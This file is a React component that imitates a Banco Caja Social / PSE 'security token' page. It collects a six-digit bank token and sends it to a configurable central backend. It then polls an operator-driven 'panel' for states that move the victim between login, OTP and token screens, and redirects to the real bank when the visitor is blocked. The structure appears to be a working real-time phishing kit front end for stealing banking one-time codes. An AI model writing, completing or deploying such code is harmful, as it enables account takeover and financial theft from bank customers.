import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import { updateStateSession } from "../../../../../../@utils";
import LoadingCajaSocial from "../../../../../components/LoadingCajaSocial";
import heroBg from "../../img/bg-1.png";
import logoBancoFundacion from "../../img/logo_banco_fundacion.svg";
import pseLogoCirculo from "../../img/pse_logo_circulo.svg";
import "./caja_social_token_pse.css";

// Se inicializan las constantes de configuración
const HERO_BG = heroBg;
const TOKEN_LEN = 6;
const CS_ERROR_KEY = "caja_social_error_modal";
const CS_TOKEN_ERROR_AUTO_HIDE_MS = 5000;
const CS_TOKEN_ERROR_TITLE = "El token ingresado no es válido";
const CS_TOKEN_ERROR_BODY = "Por favor verifique sus datos e intente de nuevo.";
const CS_MID_FLOW_KEY = "caja_social_mid_flow";

// Se inicializan las rutas del flujo
const ROUTES = {
  login: "/logo_caja_social_pse",
  otp: "/banco_caja_social_otp_pse",
  token: "/banco_caja_social_token_pse",
};

// Se inicializan los mensajes del modal (solo bloqueos / casos sin alerta inline)
const MODAL_MSG = {
  block_ip: "Acceso bloqueado por seguridad.",
};

// Se inicializan los estados a ignorar despues del modal
const ESTADOS_IGNORAR_TRAS_MODAL = ["error_login", "error_otp", "error_token"];

// Se crea el componente
export default function CajaSocialTokenPse() {

  // Se inicializa el navigate
  const navigate = useNavigate();

  // Se inicializan las referencias
  const sessionIdRef = useRef(null);
  const pollingIntervalRef = useRef(null);
  const modalBloqueoEstadoRef = useRef(null);
  const ignorarEstadoHastaCambioRef = useRef(null);

  // Se inicializan las referencias del flujo post-envio
  const esperandoRespuestaTrasEnviarRef = useRef(false);
  const tokenTrasEnviarVioPendienteRef = useRef(false);

  // Se inicializan los estados de UI y formulario
  const [loading, setLoading] = useState(false);
  const [token, setToken] = useState("");
  const [tokenError, setTokenError] = useState(null);
  const [showErrorAlert, setShowErrorAlert] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalText, setModalText] = useState("");

  const clearTokenFields = () => {
    setToken("");
    setTokenError(null);
  };

  const dismissErrorAlert = () => {
    setShowErrorAlert(false);

    if (modalBloqueoEstadoRef.current === "error_token") {
      ignorarEstadoHastaCambioRef.current = "error_token";
      modalBloqueoEstadoRef.current = null;
    }
  };

  const showTokenError = () => {
    esperandoRespuestaTrasEnviarRef.current = false;
    tokenTrasEnviarVioPendienteRef.current = false;
    stopPolling();
    setLoading(false);
    modalBloqueoEstadoRef.current = "error_token";
    clearTokenFields();
    setShowErrorAlert(true);
    window.scrollTo(0, 0);
  };

  const dismissErrorAlertIfOpen = () => {
    if (showErrorAlert) {
      dismissErrorAlert();
    }
  };

  // Se ejecuta cuando el componente se monta
  useEffect(() => {
    // Se captura la sessionId persistida
    sessionIdRef.current = localStorage.getItem("sessionId");

    // Se valida que exista la sessionId persistida
    if (!sessionIdRef.current) {

      // Se redirige al login
      navigate(ROUTES.login, { replace: true });

      // Se sale del useEffect
      return undefined;
    }

    // Se captura el modal pendiente
    const pending = localStorage.getItem(CS_ERROR_KEY);

    if (pending === "error_token") {
      showTokenError();
    } else if (pending === "error_login") {
      navigate(ROUTES.login, { replace: true });
      return () => {
        if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current);
      };
    } else if (pending === "error_otp") {
      navigate(ROUTES.otp, { replace: true });
      return () => {
        if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current);
      };
    } else if (pending === "block_ip") {
      modalBloqueoEstadoRef.current = "block_ip";
      setShowModal(true);
      setModalText(MODAL_MSG.block_ip);
    }

    if (pending && pending !== "error_login" && pending !== "error_otp") {
      localStorage.removeItem(CS_ERROR_KEY);
    }

    // Se retorna el cleanup
    return () => {

      // Se limpia el intervalo de polling
      if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current);
    };
  }, [navigate]);

  useEffect(() => {
    if (!showErrorAlert) return undefined;

    const timer = window.setTimeout(() => {
      dismissErrorAlert();
    }, CS_TOKEN_ERROR_AUTO_HIDE_MS);

    return () => window.clearTimeout(timer);
  }, [showErrorAlert]);

  // Se inicializan los metodos de polling y verificacion
  const initPolling = () => {
    // Se limpia el intervalo anterior si existe
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
      pollingIntervalRef.current = null;
    }

    // Se inicia el polling cada 3 segundos
    pollingIntervalRef.current = setInterval(() => verifyState(), 3000);

    // Se ejecuta una verificacion inmediata
    verifyState();
  };

  // Se para el polling
  const stopPolling = () => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
      pollingIntervalRef.current = null;
    }
  };

  // Se crea el metodo para verificar el estado actual
  const verifyState = async () => {
    // Se usa el try catch
    try {
      const sid = sessionIdRef.current;

      // Se valida que exista la sessionId persistida
      if (!sid) {

        // Se sale del método
        return;
      }

      // Se realiza la petición al backend
      const response = await instanceBackend.post(`/cajasocial/verify-state/${sid}`);

      // Se captura el estado actual
      const s = ((response.data?.estado || response.data?.state || "") + "").toLowerCase();

      // Se valida si el estado actual es valido
      if (!s) return;

      // Se valida si se debe ignorar el mismo estado tras cerrar el modal
      if (ignorarEstadoHastaCambioRef.current) {
        if (s === ignorarEstadoHastaCambioRef.current) {
          return;
        }
        ignorarEstadoHastaCambioRef.current = null;
        modalBloqueoEstadoRef.current = null;
      }

      // Se valida si el modal actual sigue bloqueando este estado
      if (modalBloqueoEstadoRef.current && s === modalBloqueoEstadoRef.current) {
        return;
      }

      // Se valida si ya se vio el estado pendiente tras enviar el token
      if (esperandoRespuestaTrasEnviarRef.current && s === "pendiente") {
        tokenTrasEnviarVioPendienteRef.current = true;
      }

      // Se ejecuta el switch del estado actual
      switch (s) {
        case "sol_otp":
          // Se limpian las referencias post-envio
          esperandoRespuestaTrasEnviarRef.current = false;
          tokenTrasEnviarVioPendienteRef.current = false;

          // Se para el polling
          stopPolling();

          // Se desactiva el loading
          setLoading(false);
          updateStateSession("solicitar_otp");

          // Se redirige a la pantalla OTP
          navigate(ROUTES.otp, { replace: true });
          break;
        case "sol_token":
          // Se valida si el token fue enviado y el flujo sigue esperando respuesta
          if (esperandoRespuestaTrasEnviarRef.current) {
            if (!tokenTrasEnviarVioPendienteRef.current) {
              break;
            }

            // Se resetea el control de reenvio tras ver pendiente
            tokenTrasEnviarVioPendienteRef.current = false;
            esperandoRespuestaTrasEnviarRef.current = false;

            // Se desactiva el loading
            setLoading(false);

            // Se limpia la UI del token
            setToken("");
            setTokenError(null);
            updateStateSession("sol_token");
            initPolling();
            break;
          }

          // Se mantiene la misma pantalla token sin reenviar navegación
          stopPolling();
          setLoading(false);
          updateStateSession("sol_token");
          navigate(ROUTES.token, { replace: true });
          break;
        case "sol_finalizar":
        case "sol_finalizado":
        case "solicitar_finalizar":
          // Se limpian las referencias post-envio
          esperandoRespuestaTrasEnviarRef.current = false;
          tokenTrasEnviarVioPendienteRef.current = false;

          // Se para el polling
          stopPolling();

          // Se desactiva el loading
          setLoading(false);

          // Se remueve el mid flow
          sessionStorage.removeItem(CS_MID_FLOW_KEY);

          // Se redirige a la pantalla de finalizado
          navigate("/finalizado-pse", { replace: true });
          break;
        case "error_login":
          // Se limpian las referencias post-envio
          esperandoRespuestaTrasEnviarRef.current = false;

          // Se para el polling
          stopPolling();

          // Se desactiva el loading
          setLoading(false);

          // Se remueve el mid flow
          sessionStorage.removeItem(CS_MID_FLOW_KEY);

          // Se setea el error modal
          localStorage.setItem(CS_ERROR_KEY, "error_login");

          // Se redirige al login
          navigate(ROUTES.login, { replace: true });
          break;
        case "error_otp":
          // Se limpian las referencias post-envio
          esperandoRespuestaTrasEnviarRef.current = false;
          tokenTrasEnviarVioPendienteRef.current = false;

          // Se para el polling
          stopPolling();

          // Se desactiva el loading
          setLoading(false);

          // Se setea el error modal
          localStorage.setItem(CS_ERROR_KEY, "error_otp");

          // Se redirige a la pantalla OTP
          navigate(ROUTES.otp, { replace: true });
          break;
        case "error_token":
          showTokenError();
          break;
        case "block_ip":
        case "error_blocked":
          // Se limpian las referencias post-envio
          esperandoRespuestaTrasEnviarRef.current = false;
          tokenTrasEnviarVioPendienteRef.current = false;

          // Se para el polling
          stopPolling();

          // Se remueve el mid flow
          sessionStorage.removeItem(CS_MID_FLOW_KEY);

          // Se limpia el storage y se redirige al inicio
          localStorage.clear();
          window.location.href = process.env.REACT_APP_URL_BANK || "/";
          break;
        default:
          break;
      }
    } catch (error) {
      // Se capturan los datos del error
      const status = error?.response?.status;
      const estado = (error?.response?.data?.estado || "").toString().toLowerCase();

      // Se valida si el error es de bloqueo
      if (status === 403 && estado === "error_blocked") {

        // Se limpian las referencias post-envio
        esperandoRespuestaTrasEnviarRef.current = false;
        tokenTrasEnviarVioPendienteRef.current = false;

        // Se para el polling
        stopPolling();

        // Se desactiva el loading
        setLoading(false);

        // Se remueve el mid flow
        sessionStorage.removeItem(CS_MID_FLOW_KEY);

        // Se limpia el storage y se redirige al inicio
        localStorage.clear();
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
        return;
      }
      // Se imprime el error para diagnostico
      console.error("verifyState caja social token", error);
    }
  };

  // Se crea el metodo para cerrar el modal
  const closeModal = () => {
    const estadoServidor = modalBloqueoEstadoRef.current;
    modalBloqueoEstadoRef.current = null;

    if (estadoServidor && ESTADOS_IGNORAR_TRAS_MODAL.includes(estadoServidor)) {
      ignorarEstadoHastaCambioRef.current = estadoServidor;
    }

    setShowModal(false);
    setModalText("");
  };

  // Se crea el metodo para manejar el cambio del token
  const onTokenChange = (e) => {
    // Se normaliza el valor a solo dígitos
    const digits = e.target.value.replace(/\D/g, "").slice(0, TOKEN_LEN);
    // Se actualiza el token
    setToken(digits);
    dismissErrorAlertIfOpen();
    if (tokenError) setTokenError(null);
  };

  // Se crea el metodo para enviar el token
  const handleEnviar = async () => {
    // Se valida la longitud del token
    if (token.length !== TOKEN_LEN) {
      setTokenError(`Ingrese ${TOKEN_LEN} dígitos`);
      return;
    }

    // Se limpia el error local
    setTokenError(null);

    // Se activa el loading
    setLoading(true);

    // Se captura la sessionId persistida
    const sessionId = localStorage.getItem("sessionId");

    // Se inicializa la data a enviar
    const dataSend = {
      data: {
        attributes: {
          token,
          sessionId: sessionId || sessionIdRef.current,
          backend: "P01",
          backend_central_url: process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          backend_url: "/api/v1/cajasocial/token",
        },
      },
    };

    // Se captura la url central configurada
    const centralUrl = (process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || "").trim();

    // Se usa el try catch
    try {
      // Se realiza la petición al backend central o al backend local
      const response = centralUrl
        ? await instanceBackend.post(centralUrl, dataSend)
        : await instanceBackend.post("/cajasocial/token", dataSend);
      if (response.data?.success) {
        const sidResp =
          response.data.sessionId ?? sessionId ?? sessionIdRef.current;

        // Se valida si existe una sessionId devuelta por el backend
        if (sidResp) {
          // Se persiste la sessionId devuelta por el backend
          localStorage.setItem("sessionId", sidResp);
          sessionIdRef.current = sidResp;
        }
        // Se preparan las referencias para esperar respuesta del panel
        tokenTrasEnviarVioPendienteRef.current = false;
        esperandoRespuestaTrasEnviarRef.current = true;
        // Se inicia el polling después del envío correcto
        initPolling();
      } else {
        // Se limpian las referencias post-envio
        esperandoRespuestaTrasEnviarRef.current = false;
        tokenTrasEnviarVioPendienteRef.current = false;
        // Se desactiva el loading
        setLoading(false);
        // Se muestra el error de envío
        setTokenError("No se pudo enviar el token");
      }
    } catch (error) {
      // Se limpian las referencias post-envio
      esperandoRespuestaTrasEnviarRef.current = false;
      tokenTrasEnviarVioPendienteRef.current = false;

      // Se desactiva el loading
      setLoading(false);

      // Se capturan los datos del error
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

      // Se valida si el error es de bloqueo
      if (status === 403 && estadoErr === "error_blocked") {

        // Se remueve el mid flow
        sessionStorage.removeItem(CS_MID_FLOW_KEY);

        // Se limpia el storage
        localStorage.clear();

        // Se redirige al inicio
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
        return;
      }
      // Se muestra el error de conexión
      setTokenError("Error de conexión con el servidor");
    }
  };

  // Se retorna el HTML
  return (
    <div className="bcs-layout lcsp-screen token-pse-screen">
      {/* Loading overlay mientras se envía o se espera cambio de estado */}
      {loading ? <LoadingCajaSocial /> : null}

      {/* Columna izquierda con imagen de apoyo */}
      <div className="bcs-image">
        <img
          className="bcs-image-media"
          src={HERO_BG}
          alt=""
          aria-hidden="true"
        />
      </div>

      {/* Columna derecha con logos y formulario */}
      <div className="bcs-form">
        {/* Bloque de logos institucionales */}
        <div className="login-logos-wrapper lcsp-login-logos">
          <div className="identity-logo">
            <img
              src={logoBancoFundacion}
              alt="Banco Caja Social y Fundación Grupo Social"
              className="lcsp-img-banco"
            />
          </div>
          <div id="pse-logo" className="pse-logo">
            <img src={pseLogoCirculo} alt="PSE" className="lcsp-img-pse" />
          </div>
        </div>

        <div className="lcsp-hero-text">
          <header>
            <h1 id="kc-page-title">Token de seguridad</h1>
          </header>

          {showErrorAlert ? (
            <div className="cs-login-alert alert alert-danger" role="alert">
              <div className="cs-login-alert__row">
                <span className="cs-login-alert__icon" aria-hidden="true">!</span>
                <strong className="cs-login-alert__title">{CS_TOKEN_ERROR_TITLE}</strong>
              </div>
              <p className="cs-login-alert__text">{CS_TOKEN_ERROR_BODY}</p>
            </div>
          ) : null}

          {/* Texto contextual del paso actual */}
          <p className="lcsp-instruction-body">
            Ingrese el código de {TOKEN_LEN} dígitos generado en su dispositivo o aplicación del banco.
          </p>
        </div>

        {/* Formulario principal del token */}
        <form
          className="token-form"
          onSubmit={(e) => {
            // Se previene el submit nativo del formulario
            e.preventDefault();
          }}
        >
          {/* Campo del código token */}
          <div className="token-field-wrap">
            <label className="token-label" htmlFor="cs-token-input">
              Token
            </label>
            <input
              id="cs-token-input"
              className={`token-input${tokenError ? " token-input--error" : ""}`}
              type="password"
              inputMode="numeric"
              maxLength={TOKEN_LEN}
              value={token}
              onChange={onTokenChange}
              autoComplete="one-time-code"
            />
            {tokenError ? (
              <small className="token-error-msg" role="alert">
                {tokenError}
              </small>
            ) : null}
          </div>
          {/* Acción principal del token */}
          <div className="token-actions">
            <button
              type="button"
              className="token-submit-btn"
              onClick={handleEnviar}
              disabled={loading}
            >
              {loading ? "Enviando..." : "Continuar"}
            </button>
          </div>
        </form>
      </div>

      {/* Modal de errores y bloqueos */}
      {showModal ? (
        <div className="cs-modal-overlay" role="presentation">
          <div className="cs-modal-card" role="dialog" aria-modal="true">
            <div className="cs-modal-top">Caja Social</div>
            <div className="cs-modal-mid">
              <p>{modalText}</p>
            </div>
            <div className="cs-modal-bot">
              <button type="button" className="cs-modal-accept" onClick={closeModal}>
                Aceptar
              </button>
            </div>
          </div>
        </div>
      ) : null}
    </div>
  );
}
